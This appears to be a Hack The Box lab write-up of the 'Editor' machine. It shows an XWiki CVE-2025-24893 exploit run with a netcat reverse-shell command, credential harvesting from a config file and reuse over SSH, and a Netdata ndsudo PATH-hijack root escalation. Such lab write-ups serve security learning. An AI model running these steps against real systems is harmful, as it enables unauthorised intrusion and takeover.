---
title: Hack The Box - Editor (2025) Writeup
date: 2025-08-29 18:00:00
categories:
  - HackTheBox
  - Writeups
tags:
  - Editor
  - XWiki
  - CVE-2025-24893
  - Netdata
  - CVE-2024-32019
  - Privilege Escalation
---

# Editor (Hack The Box) - 2025

> "Okay, so this one took me FOREVER to figure out. Like, I was stuck for hours on the dumbest things..."

---

## 1. The Usual Start: Nmap and Confusion

Alright, so I started with the basics. Added the IP to my hosts file:

```bash
echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts
```

Then ran my standard Nmap scan:

```bash
nmap -sV -sC -Pn 10.10.11.80
```

Got this:
```
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp   open  http    nginx 1.18.0 (redirects to http://editor.htb/)
8080/tcp open  http    Jetty 10.0.20 (XWiki with WebDAV enabled)
```

Cool, so we have SSH, a web server, and something called XWiki on port 8080. I had NO idea what XWiki was at first, so I just started poking around.

---

## 2. Web Enumeration: Getting Lost in the Sauce

I checked the main website first - nothing interesting, just a basic page. Then I went to port 8080 and saw this XWiki thing. It looked like some kind of wiki/documentation system.

I spent like 30 minutes trying to find login pages, looking for default credentials, checking robots.txt... basically doing everything except the right thing. I even tried some basic SQL injection attempts (spoiler: didn't work).

Then I noticed at the bottom of the page it said "XWiki Version: 15.10.8". I was like, "Hmm, maybe I should check if this version has any known vulnerabilities?"

---

## 3. The Google Rabbit Hole

So I googled "XWiki 15.10.8 vulnerability" and found this CVE-2025-24893 thing. Apparently it affects versions before 15.10.11, and mine was 15.10.8, so it should be vulnerable!

I found a PoC on GitHub and was super excited:

```bash
git clone https://github.com/gunzf0x/CVE-2025-24893
cd CVE-2025-24893
```

But then I read the README and realized I needed to understand how this exploit worked. It was like 2 AM and I was getting frustrated because I kept messing up the syntax.

---

## 4. First Attempts: Epic Fail

I tried running the exploit like 5 different ways and kept getting errors. I was like "Why isn't this working??" 

Finally, I figured out the right syntax (after reading the help like 10 times):

```bash
python3 CVE-2025-24893.py -t http://editor.htb:8080/ -c 'busybox nc 10.10.14.25 4444 -e /bin/bash'
```

I had my netcat listener ready:

```bash
nc -lnvp 4444
```

And BOOM! I got a shell! I was so hyped, you have no idea. I immediately upgraded it to a proper PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 5. The User Hunt: Where's Oliver?

So I'm in as the `xwiki` user, but I need to find the user flag. I checked `/home` and saw there was a user called `oliver`:

```bash
cd /home
ls
# Output: oliver
```

I tried to access his directory but got permission denied. I was like "Okay, I need to find his password somehow."

I started looking through config files, and honestly, I was about to give up when I found this in the XWiki config:

```bash
cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml | grep password
```

There it was:
```xml
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

I was like "This HAS to be oliver's password, right?" So I tried SSH:

```bash
ssh oliver@editor.htb
```

And it worked! I was so relieved.

---

## 6. User Flag: Finally!

Once I was in as oliver, I found the user flag immediately:

```bash
ls
# Output: user.txt

cat user.txt
# Output: *********************
```

One down, one to go!

---

## 7. Privilege Escalation: The Real Struggle

Now for the hard part - getting root. I started with the usual stuff:

```bash
find / -type f -perm -4000 -user root 2>/dev/null
```

I found this weird thing:
```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

I had no idea what Netdata was, but I googled it and found out it was vulnerable to CVE-2024-32019. I was like "Wait, this could actually work!"

---

## 8. The Simple Bash Trick

So I was looking at this Netdata thing and realized I didn't actually need to write a C program! I could just create a fake nvme binary using bash. This was way easier than I thought:

```bash
echo '#!/bin/bash' > /tmp/nvme
echo '/bin/bash -p' >> /tmp/nvme
chmod +x /tmp/nvme
```

Then I put `/tmp` at the front of my PATH so it would find my fake binary first:

```bash
export PATH=/tmp:$PATH
```

---

## 9. The Final Push: Root at Last!

Now for the moment of truth. I ran the ndsudo command:

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

Instead of running the real nvme binary, it executed my fake one with root privileges, dropping me straight into a root shell!

And... it worked! I got a root shell:

```bash
whoami
# Output: root
```

I was literally jumping up and down. I grabbed the root flag:

```bash
cat /root/root.txt
# Output: *********************
```

---

## What I Learned (The Hard Way)

- **Don't give up when things don't work immediately** - I almost quit like 3 times
- **Google is your best friend** - Seriously, just search for everything
- **Config files are goldmines** - Always check them for passwords
- **C programming isn't as scary as I thought** - The exploit was actually pretty simple

This box took me like 6 hours total because I kept going down wrong paths, but man, when I finally got root, it felt amazing!

> "Sometimes the best hacks are the ones that make you want to throw your laptop out the window first."

---

*This writeup is for educational purposes only. Always hack responsibly.*
